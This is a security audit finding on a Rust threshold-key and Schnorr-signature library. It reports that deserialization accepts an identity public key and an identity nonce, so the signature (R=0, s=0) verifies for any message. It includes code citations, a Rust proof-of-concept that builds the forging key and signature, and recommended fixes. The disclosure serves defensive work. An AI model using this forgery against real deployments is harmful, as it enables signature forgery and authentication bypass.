### Title
Deserialized `ThresholdKeys` can have an identity group key, enabling universal Schnorr-signature forgery - (File: crypto/dkg/src/lib.rs)

### Summary

`ThresholdKeys::read` accepts attacker-controlled verification shares without rejecting the identity point, and `ThresholdKeys::new` does not reject an identity aggregate `group_key`. A serialized one-of-one key with an identity verification share therefore deserializes successfully and produces an identity public key. Because `SchnorrSignature::read` likewise permits an identity nonce commitment and Schnorr verification reduces to `R + cA - sG`, the signature `(R = 0, s = 0)` verifies for every challenge when `A` is identity.

### Finding Description

`Ciphersuite::read_G` validates only that an encoding represents a canonical group element; it does not reject the identity element. [1](#0-0)  `ThresholdKeys::read` uses this permissive parser for every supplied verification share and then forwards the resulting map to `ThresholdKeys::new`. [2](#0-1)  `ThresholdKeys::new` calculates `group_key` by interpolating the supplied verification shares but performs no identity check before returning the key. [3](#0-2) 

`group_key()` returns the interpolated key after applying the ephemeral scalar and offset, so the malicious deserialized key exposes the identity as its public key. [4](#0-3)  Separately, `SchnorrSignature::read` accepts the identity encoding for `R`, because it uses the same permissive `Ciphersuite::read_G` parser. [5](#0-4) 

The Schnorr verification statement is `R + cA - sG = 0`. [6](#0-5)  With `R = 0`, `A = 0`, and `s = 0`, all three terms are identity regardless of the challenge, so verification succeeds unconditionally. [7](#0-6) 

### Impact Explanation

An attacker who can cause a verifier to deserialize attacker-supplied `ThresholdKeys` bytes can register or install an identity public key and then submit a canonical identity Schnorr signature that verifies for every message and every correctly formed challenge. This is a concrete signature forgery caused by accepting the zero public-key value, directly analogous to the report's missing zero-oracle-answer validation.

### Likelihood Explanation

The attack is deterministic and does not depend on finding a rare hash output or compromise of a private key. Its reachability depends on a caller treating serialized `ThresholdKeys` as untrusted input or loading key material supplied by an external party, but the exposed `ThresholdKeys::read` and `SchnorrSignature::read` APIs accept all required attacker-controlled bytes directly.

### Recommendation

Reject degenerate threshold keys at construction and deserialization:

- In `ThresholdKeys::new`, reject identity verification shares and reject a computed `group_key` that is identity.
- Verify that `C::generator() * secret_share == verification_shares[params.i()]` so malformed serialized keys cannot pair an unrelated private share with public verification shares.
- Where a nonzero public key is semantically required, parse points with an identity-rejecting helper rather than `Ciphersuite::read_G`.
- Consider rejecting identity `R` and identity `public_key` in `SchnorrSignature::verify`, or provide a strict verification API for public-key validation.

### Proof of Concept

```rust
// C is an in-scope ciphersuite. The encoded key is:
// curve ID || t = 1 || n = 1 || i = 1 || Lagrange || zero share || identity share.
fn forge_with_identity_threshold_key<C: Ciphersuite>() {
  let mut encoded = Vec::new();
  encoded.extend(u32::try_from(C::ID.len()).unwrap().to_le_bytes());
  encoded.extend(C::ID);
  encoded.extend(1u16.to_le_bytes()); // t
  encoded.extend(1u16.to_le_bytes()); // n
  encoded.extend(1u16.to_le_bytes()); // i
  encoded.push(1);                    // Interpolation::Lagrange
  encoded.extend(C::F::ZERO.to_repr().as_ref());
  encoded.extend(C::G::identity().to_bytes().as_ref());

  let keys = ThresholdKeys::<C>::read(&mut encoded.as_slice()).unwrap();
  assert!(bool::from(keys.group_key().is_identity()));

  // Signature bytes: identity R || zero s.
  let mut sig_bytes = Vec::new();
  sig_bytes.extend(C::G::identity().to_bytes().as_ref());
  sig_bytes.extend(C::F::ZERO.to_repr().as_ref());
  let signature = SchnorrSignature::<C>::read(&mut sig_bytes.as_slice()).unwrap();

  // Any properly computed challenge still succeeds because both cA and sG are identity.
  let challenge = C::hash_to_F(b"example-challenge", b"attacker-controlled message");
  assert!(signature.verify(keys.group_key(), challenge));
}
```

### Citations

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```

**File:** crypto/dkg/src/lib.rs (L376-390)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

    Ok(ThresholdKeys {
      core: Arc::new(Zeroizing::new(ThresholdCore {
        params,
        interpolation,
        secret_share,
        group_key,
        verification_shares,
      })),
      scalar: C::F::ONE,
      offset: C::F::ZERO,
    })
```

**File:** crypto/dkg/src/lib.rs (L445-447)
```rust
  pub fn group_key(&self) -> C::G {
    (self.core.group_key * self.scalar) + (C::generator() * self.offset)
  }
```

**File:** crypto/dkg/src/lib.rs (L618-630)
```rust
    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
```

**File:** crypto/schnorr/src/lib.rs (L49-53)
```rust
impl<C: Ciphersuite> SchnorrSignature<C> {
  /// Read a SchnorrSignature from something implementing Read.
  pub fn read<R: Read>(reader: &mut R) -> io::Result<Self> {
    Ok(SchnorrSignature { R: C::read_G(reader)?, s: C::read_F(reader)? })
  }
```

**File:** crypto/schnorr/src/lib.rs (L92-99)
```rust
    [
      // R
      (C::F::ONE, self.R),
      // cA
      (challenge, public_key),
      // -sG
      (-self.s, C::generator()),
    ]
```

**File:** crypto/schnorr/src/lib.rs (L108-110)
```rust
  pub fn verify(&self, public_key: C::G, challenge: C::F) -> bool {
    multiexp_vartime(&self.batch_statements(public_key, challenge)).is_identity().into()
  }
```
